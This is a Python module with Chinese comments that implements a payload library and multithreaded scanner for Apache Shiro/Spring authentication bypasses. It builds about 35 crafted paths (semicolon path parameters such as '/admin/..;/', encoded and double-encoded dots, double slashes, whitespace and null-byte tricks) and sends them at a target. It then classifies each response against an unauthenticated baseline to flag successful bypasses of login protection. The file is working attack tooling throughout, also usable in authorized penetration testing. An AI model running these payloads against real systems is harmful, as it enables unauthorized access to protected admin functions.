#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring + Shiro 权限绕过 payload 库与扫描器。

为什么输出里不标 CVE 编号：
    Shiro 的认证绕过是**一族由路径解析差异导致的行为**（分号路径参数、编码点号、
    双斜杠、尾随斜杠、空白字符……）。Apache 的安全公告只描述“构造的请求可导致
    认证绕过”，并不会给出“某个 payload 对应某个 CVE”的权威映射；同一路径在不同
    Shiro/Spring/容器版本下可能对应不同 CVE，反过来一个 CVE 也覆盖多种变形。

    因此这里按**技术手法（technique）**标注 payload，输出 `[semicolon]`、
    `[encoded-dot]` 这类稳定标识，避免给出错误的 CVE 归属。

payload 组织方式：
    * 按真实的解析差异族分组，每条带机制说明；
    * 判定使用「与未认证基线对比」：先请求受保护路径拿到登录页基线，
      再看变体是否返回了不同的、非登录的内容，并把 302 跳转目标纳入判断。
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import random
import string
from dataclasses import dataclass, field

from .httpc import HttpClient, Response, join_url, normalize_base

# 技术手法标识（稳定、可被脚本过滤）
TECHNIQUES = {
    "semicolon": "分号路径参数（..;/、;/、; 结尾）",
    "semicolon-encoded": "编码分号与点号的组合（%2e%2e;、..%3b）",
    "encoded-dot": "URL 编码点号/斜杠（%2e、%2e%2e）",
    "double-encoded": "双重 URL 编码（%252e）",
    "encoded-semicolon": "编码分号（%3b）",
    "double-slash": "双斜杠（//admin/）",
    "dot-segment": "点段（/./、/../）",
    "whitespace": "空白/换行/Tab（%20、%09、%0a）",
    "null-byte": "空字节截断（%00）",
    "trailing-slash": "尾随斜杠差异（/admin vs /admin/）",
    "suffix": "后缀/扩展名匹配（.、.json）",
    "subpath": "子路径（/admin/index）",
}


@dataclass(frozen=True)
class BypassPayload:
    path: str
    technique: str
    note: str


# 模板：{p} = 受保护路径（不含前后斜杠，如 admin）；{f} = 随机填充目录
_TEMPLATES: list[tuple[str, str, str]] = [
    # ---- 分号路径参数：Shiro 把 ; 之后当路径参数，Spring 会剥离 ----
    ("/{p}/..;/", "semicolon",
     "Shiro 侧把 /admin/..;/ 当作匿名路径，Spring 归一化为 /admin/"),
    ("/{f}/..;/{p}/", "semicolon",
     "前置一个无害目录，干扰 Shiro 的 AntPathMatcher 匹配"),
    ("/;/{p}/", "semicolon",
     "以 ;/ 开头，Shiro 与 Spring 对首段分号的解析不一致"),
    ("/{p}/;", "semicolon", "路径末尾分号"),
    ("/{p}/;/", "semicolon", "路径末尾分号 + 斜杠"),
    ("/{p}/..;/admin/", "semicolon", "多级 ..; 叠加"),
    ("/{p}/..;/..;/", "semicolon", "..; 路径穿越变体"),
    ("/{p}/%2e%2e;/", "semicolon-encoded", "编码点号 + 分号"),
    ("/{p}/..%3b/", "semicolon-encoded", "编码分号接在 .. 之后"),
    # ---- 编码点号 / 斜杠 ----
    ("/{p}/%2e", "encoded-dot", "%2e 在 Shiro 侧不归一化，Spring 侧会解码"),
    ("/{p}/%2e/", "encoded-dot", "同上，带尾随斜杠"),
    ("/%2e/{p}/", "encoded-dot", "前置 %2e 目录"),
    ("/{p}/%2e%2e/", "encoded-dot", "编码 .."),
    ("/{p}/%2e%2e%2f", "encoded-dot", "编码 ../"),
    ("/%2e%2e/{p}/", "encoded-dot", "前置 ../"),
    # ---- 双重编码 ----
    ("/{p}/%252e", "double-encoded", "双重编码点号（Spring 解码两次时生效）"),
    ("/%252e%252e/{p}/", "double-encoded", "双重编码 ../"),
    # ---- 编码分号 ----
    ("/{p}/%3b", "encoded-semicolon",
     "%3b 被 Shiro 当作路径字符，Spring 当作参数分隔符"),
    ("/{p}/%3bxxx", "encoded-semicolon", "同上，带参数值"),
    ("/{p}/%3b/", "encoded-semicolon", "编码分号 + 斜杠"),
    # ---- 双斜杠 / 点段 ----
    ("//{p}/", "double-slash", "双斜杠：Shiro 匹配 /**，Spring/Tomcat 归一化"),
    ("//{p}//", "double-slash", "双斜杠变体"),
    ("/./{p}/", "dot-segment", "点段：部分容器的 getRequestURI 不去点"),
    ("/{p}/./", "dot-segment", "尾随点段"),
    ("/{p}/../{p}/", "dot-segment", "../ 往返"),
    # ---- 空白 / 换行 / 空字节 ----
    ("/{p}/%20", "whitespace", "空格填充（RegExPathMatcher 正则匹配不到）"),
    ("/{p}/%09", "whitespace", "Tab 填充"),
    ("/{p}/%0a", "whitespace", "换行（部分容器会截断或忽略）"),
    ("/{p}/%0d%0a", "whitespace", "CRLF"),
    ("/{p}%00/", "null-byte", "空字节截断（老版本 Tomcat）"),
    # ---- 尾随斜杠 / 扩展名 ----
    ("/{p}", "trailing-slash", "Shiro 规则只匹配 /admin/ 时，/admin 可能放行"),
    ("/{p}.", "suffix", "路径尾部加点"),
    ("/{p};", "semicolon", "路径尾部分号"),
    ("/{p}.json", "suffix", "Spring 内容协商后缀匹配（后端只看前缀时）"),
    ("/{p}/index", "subpath", "常见首页子路径"),
]


def payloads_for(path: str = "/admin/") -> list[BypassPayload]:
    p = path.strip("/") or "admin"
    result: list[BypassPayload] = []
    seen: set[str] = set()
    for template, technique, note in _TEMPLATES:
        filler = "".join(random.choices(string.ascii_lowercase, k=5))
        full = template.format(p=p, f=filler)
        if full in seen:
            continue
        seen.add(full)
        result.append(BypassPayload(path=full, technique=technique, note=note))
    return result


_LOGIN_MARKERS = (
    "登录", "登陆", "login", "signin", "sign in", "password", "passwd",
    "验证码", "captcha", "用户名", "username", "sso", "cas/login",
)
_LOGIN_PATH_MARKERS = ("login", "signin", "sso", "cas", "auth", "passport")


@dataclass
class BypassResult:
    path: str
    technique: str
    note: str
    status: int = 0
    length: int = 0
    redirect: str = ""
    verdict: str = "FAILED"      # BYPASS / MAYBE / FAILED / AUTH / ERROR
    detail: str = ""

    def line(self) -> str:
        loc = f" -> {self.redirect}" if self.redirect else ""
        return (f"[{self.verdict:<6}] HTTP {self.status}  {self.length}B  "
                f"{self.path}{loc}  [{self.technique}]")


@dataclass
class BypassReport:
    url: str
    protected_path: str
    baseline: Response | None = None
    baseline_is_protected: bool = False
    results: list[BypassResult] = field(default_factory=list)

    @property
    def bypassed(self) -> list[BypassResult]:
        return [r for r in self.results if r.verdict == "BYPASS"]

    @property
    def maybe(self) -> list[BypassResult]:
        return [r for r in self.results if r.verdict == "MAYBE"]

    def describe(self) -> str:
        lines = [f"目标: {self.url}", f"受保护路径: {self.protected_path}"]
        if self.baseline is not None:
            lines.append(f"未认证基线: {self.baseline.summary()}")
        if not self.baseline_is_protected:
            lines.append("[!] 基线看起来不需要认证，绕过测试意义有限（先确认路径是否正确）")
        lines.append(f"测试 {len(self.results)} 条 payload："
                     f"BYPASS {len(self.bypassed)} / MAYBE {len(self.maybe)}")
        for r in self.results:
            lines.append("  " + r.line())
        return "\n".join(lines)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "protected_path": self.protected_path,
            "baseline": self.baseline.summary() if self.baseline else None,
            "baseline_is_protected": self.baseline_is_protected,
            "results": [r.__dict__ for r in self.results],
        }


def _is_login_page(resp: Response) -> bool:
    body = resp.text.lower()
    hits = sum(1 for m in _LOGIN_MARKERS if m in body)
    if hits >= 2:
        return True
    if resp.status == 200 and hits >= 1 and len(resp.body) < 3000:
        return True
    return False


def _redirect_to_login(resp: Response) -> bool:
    loc = (resp.header("location") or "").lower()
    return any(m in loc for m in _LOGIN_PATH_MARKERS)


def _classify(resp: Response, baseline: Response | None) -> tuple[str, str]:
    if resp.error:
        return "ERROR", resp.error
    if resp.status in (301, 302, 303, 307, 308):
        if _redirect_to_login(resp):
            return "FAILED", f"跳转到登录: {resp.header('location')}"
        if resp.header("location"):
            return "MAYBE", f"跳转到非登录地址: {resp.header('location')}"
        return "MAYBE", "无 Location 的跳转"
    if resp.status in (401, 403):
        return "AUTH", "需要认证/被拒绝"
    if resp.status != 200:
        return "FAILED", f"HTTP {resp.status}"
    if _is_login_page(resp):
        return "FAILED", "返回登录页"
    if baseline is not None and baseline.status == 200 and baseline.body:
        # 与基线几乎相同 => 并没有真正的权限差异
        if (abs(len(resp.body) - len(baseline.body)) < 32 and
                hashlib.md5(resp.body).digest() == hashlib.md5(baseline.body).digest()):
            return "FAILED", "与基线完全一致"
    if len(resp.body) < 200:
        return "MAYBE", "200 但内容过短，需人工确认"
    return "BYPASS", f"200 + 非登录内容（{len(resp.body)} 字节）"


def scan(client: HttpClient, url: str, protected_path: str = "/admin/",
         payloads: list[BypassPayload] | None = None, threads: int = 8,
         verbose: bool = True) -> BypassReport:
    base = normalize_base(url)
    payloads = payloads or payloads_for(protected_path)
    report = BypassReport(url=base, protected_path=protected_path)

    baseline = client.get(join_url(base, protected_path))
    report.baseline = baseline
    report.baseline_is_protected = not (baseline.status == 200 and
                                        not _is_login_page(baseline))
    if verbose:
        print(f"[*] 基线: {baseline.summary()} "
              f"({'受保护' if report.baseline_is_protected else '无需认证/无法判断'})")

    def _one(payload: BypassPayload) -> BypassResult:
        resp = client.get(join_url(base, payload.path))
        verdict, detail = _classify(resp, baseline)
        return BypassResult(path=payload.path, technique=payload.technique,
                            note=payload.note, status=resp.status,
                            length=len(resp.body),
                            redirect=resp.header("location") or "",
                            verdict=verdict, detail=detail)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads)) as pool:
        futures = {pool.submit(_one, p): p for p in payloads}
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
            except Exception as exc:  # noqa: BLE001
                payload = futures[future]
                result = BypassResult(path=payload.path,
                                      technique=payload.technique,
                                      note=payload.note, verdict="ERROR",
                                      detail=str(exc))
            report.results.append(result)

    report.results.sort(key=lambda r: ({"BYPASS": 0, "MAYBE": 1, "AUTH": 2,
                                        "FAILED": 3, "ERROR": 4}.get(r.verdict, 5),
                                       r.path))
    if verbose:
        print(report.describe())
    return report
